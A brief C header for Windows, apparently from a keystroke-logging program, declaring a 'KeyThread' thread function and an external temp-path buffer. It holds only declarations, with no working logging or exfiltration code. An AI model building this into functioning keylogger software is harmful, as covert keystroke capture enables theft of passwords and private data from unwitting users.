#ifndef LOGGER_H
#define LOGGER_H

#include <windows.h>

#pragma warning(disable:4996)

extern char tempPath[];

DWORD __stdcall KeyThread(LPVOID lpParameter);

#endif
